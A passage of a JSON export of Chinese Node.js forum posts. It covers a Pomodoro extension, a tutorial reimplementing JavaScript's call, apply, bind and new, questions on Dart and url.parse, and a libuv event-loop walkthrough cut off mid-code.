rest</li>\n<li>show tomatoes of last 12 hours on clock</li>\n<li>view tomato history on calendar</li>\n<li>override default page for new tab</li>\n<li>indicate time on the extension icon</li>\n<li>get notifications when a tomato is finished</li>\n</ul>\n<h2>Screenshots</h2>\n<h3>Editing Todo list</h3>\n<p><img src=\"https://raw.githubusercontent.com/timqian/images/master/tomatopie-intro1.gif\" alt></p>\n<h3>Doing Pomodoro</h3>\n<p><img src=\"https://raw.githubusercontent.com/timqian/images/master/tomatopie-intro2.gif\" alt></p>\n</div>","title":"Tomato-Pie: 番茄工作发的一种新 UI 尝试，在时钟上管理你的时间","last_reply_at":"2019-03-18T16:55:24.372Z","good":false,"top":false,"reply_count":0,"visit_count":483,"create_at":"2019-03-18T16:55:24.372Z","author":{"loginname":"timqian","avatar_url":"https://avatars3.githubusercontent.com/u/5512552?v=4&s=120"}},{"id":"5c813fd490c14711cc8cb5ae","author_id":"5a0a5c9da57c17282e120654","tab":"share","content":"<div class=\"markdown-text\"><h1>彻底弄清 this call apply bind 以及原生实现</h1>\n<p>有关 JS 中的 this、call、apply 和 bind 的概念网络上已经有很多文章讲解了 这篇文章目的是梳理一下这几个概念的知识点以及阐述如何用原生 JS 去实现这几个功能</p>\n<h2>this 指向问题</h2>\n<h3>this</h3>\n<p>this 的指向在严格模式和非严格模式下有所不同；this 究竟指向什么是，在绝大多数情况下取决于函数如何被调用</p>\n<p><strong>全局执行环境的情况：</strong></p>\n<p>非严格模式下，this 在全局执行环境中指向全局对象(window、global、self)；严格模式下则为 undefined</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd0539070db?w=538&amp;h=80&amp;f=png&amp;s=6483\" alt=\"20190306083121.png\"></p>\n<p><strong>作为对象方法的调用情况：</strong></p>\n<p>假设函数作为一个方法被定义在对象中，那么 this 指向最后调用他的这个对象</p>\n<p>比如：</p>\n<pre class=\"prettyprint language-js\"><code>a = 10\nobj = {\n    a: 1,\n    f() {\n        console.log(this.a) &#x2F;&#x2F; this -&gt; obj\n    }\n}\n\nobj.f() &#x2F;&#x2F; 1 最后由 obj 调用\n</code></pre><p><code>obj.f()</code> 等同于 <code>window.obj.f()</code> 最后由 obj 对象调用，因此 this 指向这个 obj</p>\n<p>即便是这个对象的方法被赋值给一个变量并执行也是如此：</p>\n<pre class=\"prettyprint language-js\"><code>const fn = obj.f\nfn() &#x2F;&#x2F; 相当于 window.fn() 因此 this 仍然指向最后调用他的对象 window\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd05369cc06?w=535&amp;h=203&amp;f=png&amp;s=7326\" alt=\"20190306084716.png\"></p>\n<p><strong>call apply bind 的情况：</strong></p>\n<p>想要修改 this 指向的时候，我们通常使用上述方法改变 this 的指向</p>\n<pre class=\"prettyprint language-js\"><code>a = 10\nobj = {\n\ta: 1\n}\nfunction fn(...args) {\n\tconsole.log(this.a, &#x27;args length: &#x27;, args)\n}\n\nfn.call(obj, 1, 2)\nfn.apply(obj, [1, 2])\nfn.bind(obj, ...[1, 2])()\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd054ca59c7?w=532&amp;h=243&amp;f=png&amp;s=17095\" alt=\"20190306090239.png\"></p>\n<p>可以看到 this 全部被绑定在了 obj 对象上，打印的 <code>this.a</code> 也都为 1</p>\n<p><strong>new 操作符的情况：</strong></p>\n<p>new 操作符原理实际上就是创建了一个新的实例，被 new 的函数被称为构造函数，构造函数 new 出来的对象方法中的 this 永远指向这个新的对象：</p>\n<pre class=\"prettyprint language-js\"><code>a = 10\nfunction fn(a) { this.a = a }\nb = new fn(1)\nb.a &#x2F;&#x2F; 1\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd05514397a?w=535&amp;h=87&amp;f=png&amp;s=3828\" alt=\"20190306090716.png\"></p>\n<p><strong>箭头函数的情况：</strong></p>\n<ul>\n<li>普通函数在运行时才会确定 this 的指向</li>\n<li>箭头函数则是在函数定义的时候就确定了 this 的指向，此时的 this 指向外层的作用域</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>a = 10\nfn = () =&gt; { console.log(this.a) }\nobj = { a: 20 }\nobj.fn = fn\nobj.fn()\nwindow.obj.fn()\nf = obj.fn\nf()\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd055103211?w=535&amp;h=197&amp;f=png&amp;s=8207\" alt=\"20190306091151.png\"></p>\n<p>无论如何调用 fn 函数内的 this 永远被固定在了这个外层的作用域（上述例子中的 window 对象）</p>\n<h2>this 改变指向问题</h2>\n<p>如果需要改变 this 的指向，有以下几种方法:</p>\n<ul>\n<li>箭头函数</li>\n<li>内部缓存 this</li>\n<li>apply 方法</li>\n<li>call 方法</li>\n<li>bind 方法</li>\n<li>new 操作符</li>\n</ul>\n<h3>箭头函数</h3>\n<p><strong>普通函数</strong></p>\n<pre class=\"prettyprint language-js\"><code>a = 10\nobj = {\n    a: 1,\n    f() { &#x2F;&#x2F; this -&gt; obj\n\t\tfunction g() { &#x2F;&#x2F; this -&gt; window\n        \tconsole.log(this.a)\n    \t}\n\t\tg()\n\t}\n}\n\nobj.f() &#x2F;&#x2F; 10\n</code></pre><p>在 f 函数体内 g 函数所在的作用域中 this 的指向是 obj：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd0562909f7?w=612&amp;h=288&amp;f=png&amp;s=24219\" alt=\"20190306094032.png\"></p>\n<p>在 g 函数体内，this 则变成了 window：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd09d44fa73?w=604&amp;h=254&amp;f=png&amp;s=23810\" alt=\"20190306094118.png\"></p>\n<p><strong>改为箭头函数</strong></p>\n<pre class=\"prettyprint language-js\"><code>a = 10\nobj = {\n    a: 1,\n    f() { &#x2F;&#x2F; this -&gt; obj\n\t\tconst g = () =&gt; { &#x2F;&#x2F; this -&gt; obj\n        \tconsole.log(this.a)\n    \t}\n\t\tg()\n\t}\n}\n\nobj.f() &#x2F;&#x2F; 1\n</code></pre><p>在 f 函数体内 this 指向的是 obj：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd09d3c5889?w=617&amp;h=245&amp;f=png&amp;s=21544\" alt=\"20190306094446.png\"></p>\n<p>在 g 函数体内 this 指向仍然是 obj：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd09d6dbea4?w=613&amp;h=246&amp;f=png&amp;s=21623\" alt=\"20190306094528.png\"></p>\n<h3>内部缓存 this</h3>\n<p>这个方法曾经经常用，即手动缓存 this 给一个名为 <code>_this</code> 或 <code>that</code> 等其他变量，当需要使用时用后者代替</p>\n<pre class=\"prettyprint language-js\"><code>a = 10\nobj = {\n    a: 20,\n    f() {\n        const _this = this\n        setTimeout(function() {\n            console.log(_this.a, this.a)\n        }, 0)\n    }\n}\n\nobj.f() &#x2F;&#x2F; _this.a 指向 20 this.a 则指向 10\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd0a04f907a?w=623&amp;h=310&amp;f=png&amp;s=28310\" alt=\"20190306095926.png\"></p>\n<p>查看一下 this 和 _this 的指向，前者指向 window 后者则指向 obj 对象：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd0a0623707?w=656&amp;h=320&amp;f=png&amp;s=28003\" alt=\"20190307081510.png\"></p>\n<h3>call</h3>\n<p>call 方法第一个参数为指定需要绑定的 this 对象；其他参数则为传递的值:</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd0a4e5aa76?w=697&amp;h=154&amp;f=png&amp;s=13743\" alt=\"20190306100658.png\"></p>\n<p>需要注意的是，第一个参数如果是：</p>\n<ul>\n<li>null、undefined、不传，this 将会指向全局对象（非严格模式下）</li>\n<li>原始值将被转为对应的包装对象，如 <code>f.call(1)</code> this 将指向 <code>Number</code>，并且这个 Number 的 <code>[[PrimitiveValue]]</code> 值为 1</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>obj = {\n    name: &#x27;obj name&#x27;\n}\n\n{(function() {\n    console.log(this.name)\n}).call(obj)}\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd0c195c3d1?w=396&amp;h=145&amp;f=png&amp;s=6805\" alt=\"20190306103718.png\"></p>\n<h3>apply</h3>\n<p>与 call 类似但第二个参数必须为数组：</p>\n<pre class=\"prettyprint language-js\"><code>obj = {\n    name: &#x27;obj name&#x27;\n}\n\n{(function (...args){\n\tconsole.log(this.name, [...args])\n}).apply(obj, [1, 2, 3])}\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd0c5395da6?w=509&amp;h=148&amp;f=png&amp;s=9076\" alt=\"20190306104048.png\"></p>\n<h3>bind</h3>\n<p>比如常见的函数内包含一个异步方法：</p>\n<pre class=\"prettyprint language-js\"><code>function foo() {\n\tlet _this = this &#x2F;&#x2F; _this -&gt; obj\n\tsetTimeout(function() {\n\t\tconsole.log(_this.a) &#x2F;&#x2F; _this.a -&gt; obj.a\n\t}, 0)\n}\nobj = {\n\ta: 1\n}\nfoo.call(obj) &#x2F;&#x2F; this -&gt; obj\n&#x2F;&#x2F; 1\n</code></pre><p>我们上面提到了可以使用缓存 this 的方法来固定 this 指向，那么使用 bind 代码看起来更加优雅：</p>\n<pre class=\"prettyprint language-js\"><code>function foo() { &#x2F;&#x2F; this -&gt; obj\n\tsetTimeout(function () { &#x2F;&#x2F; 如果不使用箭头函数，则需要用 bind 方法绑定 this\n\t\tconsole.log(this.a) &#x2F;&#x2F; this.a -&gt; obj.a\n\t}.bind(this), 100)\n}\nobj = {\n\ta: 1\n}\n\nfoo.call(obj) &#x2F;&#x2F; this -&gt; obj\n&#x2F;&#x2F; 1\n</code></pre><p>或者直接用箭头函数：</p>\n<pre class=\"prettyprint language-js\"><code>function foo() { &#x2F;&#x2F; this -&gt; obj\n\tsetTimeout(() =&gt; { &#x2F;&#x2F; 箭头函数没有 this 继承外部作用域的 this\n\t\tconsole.log(this.a) &#x2F;&#x2F; this.a -&gt; obj.a\n\t}, 100)\n}\nobj = {\n\ta: 1\n}\n\nfoo.call(obj) &#x2F;&#x2F; this -&gt; obj\n&#x2F;&#x2F; 1\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd0cca7cf58?w=664&amp;h=249&amp;f=png&amp;s=21375\" alt=\"20190307082854.png\"></p>\n<h3>new 操作符</h3>\n<p>new 操作符实际上就是生成一个新的对象，这个对象就是原来对象的实例。因为箭头函数没有 this 所以函数不能作为构造函数，构造函数通过 new 操作符改变了 this 的指向。</p>\n<pre class=\"prettyprint language-js\"><code>function Person(name) {\n\tthis.name = name &#x2F;&#x2F; this -&gt; new 生成的实例\n}\np = new Person(&#x27;oli&#x27;)\nconsole.table(p)\n</code></pre><p><code>this.name</code> 表明了新创建的实例拥有一个 name 属性；当调用 new 操作符的时候，构造函数中的 this 就绑定在了实例对象上</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd0db53dd8c?w=870&amp;h=350&amp;f=png&amp;s=47162\" alt=\"20190306230406.png\"></p>\n<h2>原生实现 call apply bind new</h2>\n<p>文章上半部分讲解了 this 的指向以及如何使用 call bind apply 方法修改 this 指向；文章下半部分我们用 JS 去自己实现这三种方法</p>\n<h3>myCall</h3>\n<ul>\n<li>首先 myCall 需要被定义在 <code>Function.prototype</code> 上这样才能在函数上调用到自定义的 myCall 方法</li>\n<li>然后定义 myCall 方法，该方法内部 this 指向的就是 myCall 方法被调用的那个函数</li>\n<li>其次 myCall 第一个参数对象中新增 this 指向的这个方法，并调用这个方法</li>\n<li>最后删除这个临时的方法即可</li>\n</ul>\n<p><strong>代码实现：</strong></p>\n<pre class=\"prettyprint language-js\"><code>Function.prototype.myCall = function(ctx) {\n\tctx.fn = this\n\tctx.fn()\n\tdelete ctx.fn\n}\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd0f0089683?w=910&amp;h=230&amp;f=png&amp;s=32023\" alt=\"20190306233008.png\"></p>\n<p>最基本的 myCall 就实现了，ctx 代表的是需要绑定的对象，但这里有几个问题，如果 ctx 对象本身就拥有一个 fn 属性或方法就会导致冲突。为了解决这个问题，我们需要修改代码使用 Symbol 来避免属性的冲突：</p>\n<pre class=\"prettyprint language-js\"><code>Function.prototype.myCall = function(ctx) {\n\tconst fn = Symbol(&#x27;fn&#x27;) &#x2F;&#x2F; 使用 Symbol 避免属性名冲突\n\tctx[fn] = this\n\tctx[fn]()\n\tdelete ctx[fn]\n}\nobj = { fn: &#x27;functionName&#x27; }\nfunction foo() { console.log(this.fn) }\n\nfoo.myCall(obj)\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd0f01d7e01?w=896&amp;h=372&amp;f=png&amp;s=64991\" alt=\"20190306233305.png\"></p>\n<p>同样的，我们还要解决参数传递的问题，上述代码中没有引入其他参数还要继续修改：</p>\n<pre class=\"prettyprint language-js\"><code>Function.prototype.myCall = function(ctx, ...argv) {\n\tconst fn = Symbol(&#x27;fn&#x27;)\n\tctx[fn] = this\n\tctx[fn](...argv) &#x2F;&#x2F; 传入参数\n\tdelete ctx[fn]\n}\nobj = { fn: &#x27;functionName&#x27;, a: 10 }\nfunction foo(name) { console.log(this[name]) }\n\nfoo.myCall(obj, &#x27;fn&#x27;)\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd0f0ec709f?w=966&amp;h=710&amp;f=png&amp;s=136788\" alt=\"20190306233625.png\"></p>\n<p>另外，我们还要检测传入的第一个值是否为对象：</p>\n<pre class=\"prettyprint language-js\"><code>Function.prototype.myCall = function(ctx, ...argv) {\n\tctx = typeof ctx === &#x27;object&#x27; ? ctx || window : {} &#x2F;&#x2F; 当 ctx 是对象的时候默认设置为 ctx；如果为 null 则设置为 window 否则为空对象\n\tconst fn = Symbol(&#x27;fn&#x27;)\n\tctx[fn] = this\n\tctx[fn](...argv)\n\tdelete ctx[fn]\n}\nobj = { fn: &#x27;functionName&#x27;, a: 10 }\nfunction foo(name) { console.log(this[name]) }\n\nfoo.myCall(null, &#x27;a&#x27;)\n</code></pre><p>如果 ctx 为对象，那么检查 ctx 是否为 null 是则返回默认的 window 否则返回这个 ctx 对象；如果 ctx 不为对象那么将 ctx 设置为空对象（按照语法规则，需要将原始类型转化，为了简单说明原理这里就不考虑了）</p>\n<p>执行效果如下：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd103d8449c?w=788&amp;h=356&amp;f=png&amp;s=47943\" alt=\"20190306235453.png\"></p>\n<p>这么一来自定义的 myCall 也就完成了</p>\n<p>另外修改一下检测 ctx 是否为对象可以直接使用 Object；delete 对象的属性也可改为 ES6 的 Reflect：</p>\n<pre class=\"prettyprint language-js\"><code>Function.prototype.myCall = function(ctx, ...argv) {\n\tctx = ctx ? Object(ctx) : window\n\tconst fn = Symbol(&#x27;fn&#x27;)\n\tctx[fn] = this\n\tctx[fn](...argv)\n\tReflect.deleteProperty(ctx, fn) &#x2F;&#x2F; 等同于 delete 操作符\n\treturn result\n}\n</code></pre><h3>myApply</h3>\n<p>apply 效果跟 call 类似，将传入的数组通过扩展操作符传入函数即可</p>\n<pre class=\"prettyprint language-js\"><code>Function.prototype.myApply = function(ctx, argv) {\n\tctx = ctx ? Object(ctx) : window\n\t&#x2F;&#x2F; 或者可以鉴别一下 argv 是不是数组\n\tconst fn = Symbol(&#x27;fn&#x27;)\n\tctx[fn] = this\n\tctx[fn](...argv)\n\tReflect.deleteProperty(ctx, fn) &#x2F;&#x2F; 等同于 delete 操作符\n\treturn result\n}\n</code></pre><h3>myBind</h3>\n<p>bind 与 call 和 apply 不同的是，他不会立即调用这个函数，而是返回一个新的 this 改变后的函数。根据这一特点我们写一个自定义的 myBind：</p>\n<pre class=\"prettyprint language-js\"><code>Function.prototype.myBind = function(ctx) {\n\treturn () =&gt; { &#x2F;&#x2F; 要用箭头函数，否则 this 指向错误\n\t\treturn this.call(ctx)\n\t}\n}\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd1097374a3?w=916&amp;h=442&amp;f=png&amp;s=65402\" alt=\"20190307224718.png\"></p>\n<blockquote>\n<p>这里需要注意的是，this 的指向原因需要在返回一个箭头函数，箭头函数内部的 this 指向来自外部</p>\n</blockquote>\n<p>然后考虑合并接收到的参数，因为 bind 可能有如下写法：</p>\n<pre class=\"prettyprint language-js\"><code>f.bind(obj, 2)(2)\n&#x2F;&#x2F; or\nf.bind(obj)(2, 2)\n</code></pre><p>修改代码：</p>\n<pre class=\"prettyprint language-js\"><code>Function.prototype.myBind = function(ctx, ...argv1) {\n\treturn (...argv2) =&gt; {\n\t\treturn this.call(ctx, ...argv1, ...argv2)\n\t}\n}\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd10d29a8ca?w=916&amp;h=478&amp;f=png&amp;s=58789\" alt=\"20190307225732.png\"></p>\n<p>另外补充一点，bind 后的函数还有可能会被使用 new 操作符创建对象。因此 this 理应被忽略但传入的参数却正常传入。</p>\n<p>举个例子：</p>\n<pre class=\"prettyprint language-js\"><code>obj = {\n    name: &#x27;inner&#x27; &#x2F;&#x2F; 首先定义一个包含 name 属性的对象\n}\nfunction foo(fname, lname) { &#x2F;&#x2F; 然后定义一个函数\n\tthis.fname = fname\n\tconsole.log(fname, this.name, lname) &#x2F;&#x2F; 打印 name 属性\n}\nfoo.prototype.age = 12\n</code></pre><p>然后我们使用 bind 创建一个新的函数并用 new 调用返回新的对象：</p>\n<pre class=\"prettyprint language-js\"><code>boundf = foo.bind(obj, &#x27;oli&#x27;, &#x27;young&#x27;)\nnewObj = new boundf()\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/11/1696a9e5fd648b69?w=333&amp;h=216&amp;f=png&amp;s=14858\" alt=\"20190311095410.png\"></p>\n<p>看图片得知，尽管我们定义了 <a href=\"http://obj.name\">obj.name</a> 并且使用了 bind 方法绑定 this 但因使用了 new 操作符 this 被重新绑定在了 newObj 上。因此打印出来的 <a href=\"http://this.name\">this.name</a> 就是 undefined 了</p>\n<p>因此我们还要继续修改我们的 myBind 方法：</p>\n<pre class=\"prettyprint language-js\"><code>Function.prototype.myBind = function (ctx, ...argv1) {\n\tlet _this = this\n\tlet boundFunc = function (...argv2) { &#x2F;&#x2F; 这里不能写成箭头函数了，因为要使用 new 操作符会报错\n\t\treturn _this.call(this instanceof boundFunc ? this : ctx, ...argv1, ...argv2) &#x2F;&#x2F; 检查 this 是否为 boundFunc 的实例\n\t}\n\treturn boundFunc\n}\n</code></pre><p>然后我们使用看看效果如何：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/11/1696a9e5fde61587?w=343&amp;h=144&amp;f=png&amp;s=10608\" alt=\"20190311100213.png\"></p>\n<p>this 指向问题解决了但 newObj 实例并未继承到绑定函数原型中的值，因此还要解决这个问题，那么我们直接修改代码增加一个 prototype 的连接：</p>\n<pre class=\"prettyprint language-js\"><code>Function.prototype.myBind = function (ctx, ...argv1) {\n\tlet _this = this\n\tlet boundFunc = function (...argv2) {\n\t\treturn _this.call(this instanceof boundFunc ? this : ctx, ...argv1, ...argv2)\n\t}\n\tboundFunc.prototype = this.prototype &#x2F;&#x2F; 连接 prototype 继承原型中的值\n\treturn boundFunc\n}\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/11/1696a9e5fed702f2?w=380&amp;h=153&amp;f=png&amp;s=12029\" alt=\"20190311100453.png\"></p>\n<p>看起来不错，但还是有一个问题，尝试修改 boundf 的原型：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/11/1696a9e5fe529972?w=349&amp;h=289&amp;f=png&amp;s=19209\" alt=\"20190311103407.png\"></p>\n<p>发现我们的 foo 中原型的值也被修改了，因为直接使用 = 操作符赋值，其实本质上还是原型的值，最后我们再修改一下，使用一个空的函数来重新 new 一个：</p>\n<pre class=\"prettyprint language-js\"><code>Function.prototype.myBind = function (ctx, ...argv1) {\n\tlet _this = this\n\tlet temp = function() {} &#x2F;&#x2F; 定义一个空的函数\n\tlet boundFunc = function (...argv2) {\n\t\treturn _this.call(this instanceof temp ? this : ctx, ...argv1, ...argv2)\n\t}\n\ttemp.prototype = this.prototype &#x2F;&#x2F; 继承绑定函数原型的值\n\tboundFunc.prototype = new temp() &#x2F;&#x2F; 使用 new 操作符创建实例并赋值\n\treturn boundFunc\n}\n</code></pre><p>最后看下效果：</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/11/1696a9e5fef3f9de?w=375&amp;h=289&amp;f=png&amp;s=19323\" alt=\"20190311103534.png\"></p>\n<h3>new 操作符</h3>\n<p>最后我们再来实现一个 new 操作符名为 myNew</p>\n<p>new 操作符的原理是啥：</p>\n<ul>\n<li>生成新的对象</li>\n<li>绑定 prototype （既然是 new 一个实例，那么实例的 <code>__proto__</code> 必然要与构造函数的 prototype 相连接）</li>\n<li>绑定 this</li>\n<li>返回这个新对象</li>\n</ul>\n<p>代码实现：</p>\n<pre class=\"prettyprint language-js\"><code>function myNew(Constructor) { &#x2F;&#x2F; 接收一个 Constructor 构造函数\n\tlet newObj = {} &#x2F;&#x2F; 创建一个新的对象\n\tnewObj.__proto__ = Constructor.prototype &#x2F;&#x2F; 绑定对象的 __proto__ 到构造函数的 prototype\n\tConstructor.call(newObj) &#x2F;&#x2F; 修改 this 指向\n\treturn newObj &#x2F;&#x2F; 返回这个对象\n}\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd1235e7cbd?w=810&amp;h=426&amp;f=png&amp;s=56296\" alt=\"20190307232044.png\"></p>\n<p>然后考虑传入参数问题，继续修改代码：</p>\n<pre class=\"prettyprint language-js\"><code>function myNew(Constructor, ...argv) { &#x2F;&#x2F; 接收参数\n\tlet newObj = {}\n\tnewObj.__proto__ = Constructor.prototype\n\tConstructor.call(newObj, ...argv) &#x2F;&#x2F; 传入参数\n\treturn newObj\n}\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/16958cd123644dbd?w=848&amp;h=290&amp;f=png&amp;s=54549\" alt=\"20190307232419.png\"></p>\n<h2>小结</h2>\n<p>到此为止</p>\n<ul>\n<li>this 指向问题</li>\n<li>如何修改 this</li>\n<li>如何使用原生 JS 实现 call apply bind 和 new 方法</li>\n</ul>\n<p>再遇到类似问题，基本常见的情况都能应付得来了</p>\n<p>（完）</p>\n<p>参考：</p>\n<ul>\n<li><a href=\"https://juejin.im/post/59bfe84351882531b730bac2#heading-1\">https://juejin.im/post/59bfe84351882531b730bac2#heading-1</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000015438195#articleHeader3\">https://segmentfault.com/a/1190000015438195#articleHeader3</a></li>\n<li><a href=\"https://github.com/Abiel1024/blog/issues/16\">https://github.com/Abiel1024/blog/issues/16</a></li>\n<li>感谢 <code>webgzh907247189</code> 修改了一些代码实现</li>\n</ul>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/7/1695629d1afe5a0e?w=960&amp;h=260&amp;f=jpeg&amp;s=58713\" alt></p>\n</div>","title":"🔮彻底弄清 this call apply bind 以及原生实现","last_reply_at":"2019-03-18T14:55:42.729Z","good":false,"top":false,"reply_count":19,"visit_count":1398,"create_at":"2019-03-07T15:59:16.904Z","author":{"loginname":"oliyg","avatar_url":"https://avatars1.githubusercontent.com/u/19631785?v=4&s=120"}},{"id":"5c8b09f7acb681372d418440","author_id":"50b5bc5d637ffa4155091236","tab":"ask","content":"<div class=\"markdown-text\"><pre class=\"prettyprint\"><code>import &#x27;dart:async&#x27;;\nimport &#x27;dart:math&#x27; show Random;\n\nmain() async {\n  print(&#x27;Compute π using the Monte Carlo method.&#x27;);\n  await for (var estimate in computePi()) {\n    print(&#x27;π ≅ $estimate&#x27;);\n  }\n}\n</code></pre><p>感觉跟es6版的nodejs很象啊</p>\n</div>","title":"有人用dart开发吗？","last_reply_at":"2019-03-18T13:39:51.348Z","good":false,"top":false,"reply_count":10,"visit_count":1176,"create_at":"2019-03-15T02:12:07.106Z","author":{"loginname":"yakczh","avatar_url":"https://avatars3.githubusercontent.com/u/6591466?v=4&s=120"}},{"id":"5c8f771c7ce0df3732429788","author_id":"50b5bc5d637ffa4155091236","tab":"share","content":"<div class=\"markdown-text\"><pre class=\"prettyprint\"><code>\nconst url = require(&#x27;url&#x27;);\nsiteurl=&#x27;https:&#x2F;&#x2F;www.cnodejs.org&#x2F;&#x27;;\nresult= url.parse(siteurl);\nconsole.log(result[&#x27;port&#x27;]);\n\n  \n</code></pre></div>","title":"带https的网址，url.parse出来的port是null?","last_reply_at":"2019-03-18T12:28:21.957Z","good":false,"top":false,"reply_count":1,"visit_count":425,"create_at":"2019-03-18T10:46:52.467Z","author":{"loginname":"yakczh","avatar_url":"https://avatars3.githubusercontent.com/u/6591466?v=4&s=120"}},{"id":"5c8f8965acb681372d4199b2","author_id":"51ece401f4963ade0e95513a","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>在前面五篇关于libuv的文章中，一一把event-loop中涉及到的句柄做了简单的介绍，这篇文章我们来详细解读一下event-loop</p>\n</blockquote>\n<h2>libuv event-loop简介</h2>\n<p><code>event-loop</code>相关的代码直接翻到<a href=\"https://github.com/nodejs/node/blob/master/deps/uv/src/unix/core.c#L341-L390\">core.c</a>，这里面的逻辑非常清晰。</p>\n<pre class=\"prettyprint language-c\"><code>int uv_run(uv_loop_t* loop, uv_run_mode mode) {\n  int timeout;\n  int r;\n  int ran_pending;\n\n  r = uv__loop_alive(loop); &#x2F;&#x2F; 判断是否还存在活跃句柄\n  if (!r)\n    uv__update_time(loop); &#x2F;&#x2F; 如果不存在直接更新event-loop的loop-&gt;time（libuv事件循环内部维护的时间）\n\n  while (r != 0 &amp;&amp; loop-&gt;stop_flag == 0) {\n    uv__update_time(loop); &#x2F;&#x2F; 更新&#96;loop-&gt;time&#96;的时间\n    uv__run_timers(loop); &#x2F;&#x2F; 处理timers相关事件\n    ran_pending = uv__run_pending(loop); &#x2F;&#x2F; 处理pending相关事件\n    uv__run_idle(loop); &#x2F;&#x2F; 处理idle相关事件\n    uv__run_prepare(loop); &#x2F;&#x2F; 处理prepare相关事件\n\n    timeout = 0; &#x2F;&#x2F; 初始化uv__io_poll的轮询时间timeout\n    if ((mode == UV_RUN_ONCE &amp;&amp; !ran_pending) || mode == UV_RUN_DEFAULT) &#x2F;&#x2F; 添加对evnet-loop运行模式的判断，从而决定uv__io_poll要阻塞的时长\n      timeout = uv_backend_timeout(loop);\n\n    uv__io_poll(loop, timeout); &#x2F;&#x2F; 执行&#96;uv__io_poll&#96;阻塞循环&#96;timeout&#96;时长\n    uv__run_check(loop); &#x2F;&#x2F; 处理check相关事件\n    uv__run_closing_handles(loop); &#x2F;&#x2F; 处理close相关事件\n\n    if (mode == UV_RUN_ONCE) { &#x2F;&#x2F; 添加对evnet-loop运行模式的判断，从而决定是否再次更新loop-&gt;time处理timers相关事件\n      &#x2F;* UV_RUN_ONCE implies forward progress: at least one callback must have\n       * been invoked when it returns. uv__io_poll() can return without doing\n       * I&#x2F;O (meaning: no callbacks) when its timeout expires - which means we\n       * have pending timers that satisfy the forward progress constraint.\n       *\n       * UV_RUN_NOWAIT makes no guarantees about progress so it&#x27;s omitted from\n       * the check.\n       *&#x2F;\n      uv__update_time(loop);\n      uv__run_timers(loop);\n    }\n\n    r = uv__loop_alive(loop); &#x2F;&#x2F; 判断是否还存在活跃句柄\n    if (mode == UV_RUN_ONCE || mode == UV_RUN_NOWAIT) &#x2F;&#x2F; 添加对evnet-loop运行模式的判断从而决定是否跳出event-loop\n      break;\n  }\n\n  &#x2F;* The if statement lets gcc compile it to a conditional store. Avoids\n   * dirtying a cache line.\n   *&#x2F;\n  if (loop-&gt;stop_flag != 0)\n    loop-&gt;stop_flag = 0;\n\n  return r;\n}\n</code></pre><p><code>uv_run</code>是evnet-loop的核心方法，其中设定了事件循环中关键的触发逻辑，通读一下这段代码就能得出来初步的认识，相关注释已经加入到了源码的后面。</p>\n<h2>事件循环中的几个判断</h2>\n<blockquote>\n<p>在event-loop的代码中，大家可以发现其中掺杂了一些判断语句，这一章节给大家详细解释一下相关的判断流程。</p>\n</blockquote>\n<h3>uv_run_mode简介</h3>\n<p>在介绍这里面的判断之前，先详细介绍一下<code>uv_run_mode</code>，其取值有三种，分别为：</p>\n<ul>\n<li><code>UV_RUN_DEFAULT</code> 默认轮询模式，此模式会一直运行事件循环直到没有活跃句柄、引用句柄、和请求句柄</li>\n<li><code>UV_RUN_ONCE</code> 一次轮询模式，此模式如果<code>pending_queue</code>中有回调，则会执行回调而直接跨过<code>uv__io_poll</code>。如果没有，则此方式只会执行一次i/o轮询（<code>uv__io_poll</code>）。如果在执行过后有回调压入到了<code>pending_queue</code>中，则<code>uv_run</code>会返回非0，你需要在未来的某个时间再次触发一次<code>uv_run</code>来清空<code>pending_queue</code>。</li>\n<li><code>UV_RUN_NOWAIT</code> 一次轮询（无视<code>pending_queue</code>）模式，此模式类似<code>UV_RUN_ONCE</code>但是不会判断<code>pending_queue</code>是否存在回调，直接进行一次i/o轮询。</li>\n</ul>\n<h3>活跃句柄判断</h3>\n<p>活跃句柄判断代码如下：</p>\n<pre class=\"prettyprint language-c\"><code>r = uv__loop_alive(loop);\nif (!r)\n  uv__update_time(loop);\n</code></pre><p>这个地方主要是用于判断本次事件循环中是否有活跃句柄，<code>uv__loop_alive</code>方法展开如下：</p>\n<pre class=\"prettyprint language-c\"><code>static int 